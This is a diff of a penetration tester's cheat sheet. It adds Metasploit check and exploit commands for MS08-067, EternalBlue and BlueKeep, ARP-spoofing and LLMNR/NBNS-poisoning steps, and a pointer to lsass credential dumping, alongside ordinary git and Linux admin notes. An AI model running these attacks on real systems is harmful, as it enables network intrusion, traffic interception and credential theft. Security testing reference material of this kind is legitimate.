@@ -286,7 +286,7 @@ Decrypt TightVNC password:
 
 ```
 root@kali:$ msdbrun -q
-msf5 > irb
+msf > irb
 >> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
 >> require 'rex/proto/rfb'
@@ -605,7 +605,12 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 
 
-### ProcDump
+### lsass.exe
+
+* [www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
+
+
+#### ProcDump
 
 * [docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 * [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
@@ -629,7 +634,7 @@ $ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e passwo
 
 
 
-### SAM & NTDS
+### NTDS
 
 Locate `diskshadow.exe`:
 
@@ -1039,7 +1044,7 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 
 
 
-### MySQL (MariaDB)
+### MySQL/MariaDB
 
 ```
 root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
@@ -2248,14 +2253,6 @@ Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
 
 #### Network attacks
 
-##### ARP Spoofing
-
-```
-root@kali:$ arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
-```
-
-* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
-
 ##### LLMNR/NBNS Poisoning
 
 Responder:
@@ -2266,7 +2263,7 @@ Responder:
 
 ```
 $ git clone https://github.com/lgandx/Responder
-$ ./Responder.py -I eth0 -vwrf
+$ sudo ./Responder.py -I eth0 -vwrf
 ```
 
 Inveigh:
@@ -2286,7 +2283,26 @@ $ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.
 PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
 ```
 
-##### DHCPv6
+##### ARP Spoofing (ARP Cache Poisoning)
+
+Install and enable IP forwarding:
+
+```
+$ sudo apt install dsniff -y
+$ sudo sysctl -w net.ipv4.ip_forward=1
+(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
+(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
+```
+
+Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:
+
+```
+$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
+```
+
+* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
+
+##### DHCPv6 Spoofing
 
 mitm6.py:
 
@@ -2513,46 +2529,80 @@ PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.
 
 
 
-### LHF Exploits & Checkers
+### LHF Checkers & Exploits
 
 
-#### BlueKeep
+#### net_api
 
-CVE-2019-0708.
+**CVE-2008-4250, MS08-067**
+
+Check:
 
 ```
-msf5 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > check
+```
+
+Exploit:
+
+```
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > exploit
 ```
 
 
 #### EternalBlue
 
-CVE-2017-0144, MS17-010.
+**CVE-2017-0144, MS17-010**
+
+Check:
 
 ```
-msf5 > use auxiliary/scanner/smb/smb_ms17_010
+msf > use auxiliary/scanner/smb/smb_ms17_010
+```
+
+Exploit:
+
+```
+msf > exploit/windows/smb/ms17_010_eternalblue
 ```
 
 
-#### net_api
+#### BlueKeep
 
-CVE-2008-4250, MS08-067.
+**CVE-2019-0708**
+
+Check:
 
 ```
-msf5 > use exploit/windows/smb/ms08_067_netapi
+msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
+```
+
+Exploit:
+
+```
+msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 ```
 
 
 #### SIGRed
 
-CVE-2020-1350.
+**CVE-2020-1350**
 
 * [github.com/T13nn3s/CVE-2020-1350](https://github.com/T13nn3s/CVE-2020-1350)
+
+Check:
+
+```
+$ curl -L https://github.com/T13nn3s/CVE-2020-1350/raw/master/CVE-2020-1350-checker.ps1 > CVE-2020-1350-checker.ps1
+PS > .\CVE-2020-1350-checker.ps1
+Please make a selection: 1
+```
 
 
 #### Zerologon
 
-CVE-2020-1472.
+**CVE-2020-1472**
 
 * [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
 * [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
@@ -2640,6 +2690,7 @@ Top UDP ports:
 |   69 | TFTP       |
 |   88 | KDC        |
 |  123 | NTP        |
+|  137 | NetBIOS    |
 |  161 | SNMP       |
 |  162 | SNMPTRAP   |
 |  500 | IKE        |
@@ -3381,6 +3432,22 @@ $ sudo reboot
 
 
 
+## Dirty Network Configure
+
+```
+$ sudo service NetworkManager stop
+$ sudo ifconfig 
+$ sudo ifconfig eth0 10.10.13.37 netmask 255.255.255.0
+$ sudo route add default gw 10.10.13.1 dev eth0
+$ sudo route -n
+$ sudo vi /etc/resolv.conf 
+$ ping 8.8.8.8
+$ nslookup ya.ru
+```
+
+
+
+
 
 # Kali
 
@@ -3972,6 +4039,16 @@ $ find . -type f -print0 | xargs -0 grep <PATTERN>
 
 
 
+### readlink
+
+Get absolute path of a file:
+
+```
+$ readlink -f somefile.txt
+```
+
+
+
 ### dpkg
 
 ```
@@ -4017,17 +4094,37 @@ $ sudo fail2ban-client unban --all
 
 
 
-### Console Logging
+### git
+
+Syncing a forked repository:
+
+```
+$ git remote add upstream https://github.com/original/repository.git
+$ git fetch upstream
+
+$ git checkout master
+$ git rebase upstream/master (git merge upstream/master)
+$ git push -f origin master
+
+$ git checkout -b dev upstream/dev
+$ git rebase upstream/dev (git merge upstream/dev)
+$ git push -f origin dev
+```
 
 
-#### script
+
+
+## Console Logging
+
+
+### script
 
 ```
 $ script tool-$(date "+%FT%H%M%S").script
 ```
 
 
-#### tmux
+### tmux
 
 * [github.com/tmux-plugins/tmux-logging](https://github.com/tmux-plugins/tmux-logging)
 
@@ -4037,9 +4134,9 @@ bash ~/.tmux/plugins/tmux-logging/scripts/save_complete_history.sh
 ```
 
 
-#### Time in Prompt
+### Time in Prompt
 
-##### bash
+#### bash
 
 `~/.bashrc` (replace `!` with `%`):
 
@@ -4047,7 +4144,7 @@ bash ~/.tmux/plugins/tmux-logging/scripts/save_complete_history.sh
 PS1='${debian_chroot:!($debian_chroot)}[\D!d}|\D{!k:!M}] \[\033[01;32m\]λ  \[\033[00m\]\[\033[01;34m\]\w\[\033[00m\] '
 ```
 
-##### zsh
+#### zsh
 
 `$ZSH_CUSTOM/themes/robbyrussell.zsh-theme` (replace `!` with `%`):
 
@@ -4272,7 +4369,7 @@ Cmd > rmdir /S /Q C:\$Windows.~BT\
 
 ## Upgrade Burp
 
-* [Downloads | Jython](https://www.jython.org/download.html)
+* [Downloads / Jython](https://www.jython.org/download.html)
 * [Прокачай свой Burp! 11 наиболее полезных плагинов к Burp Suite — «Хакер»](https://xakep.ru/2018/08/23/burp-suite-plugins/)
 
 ### Extensions
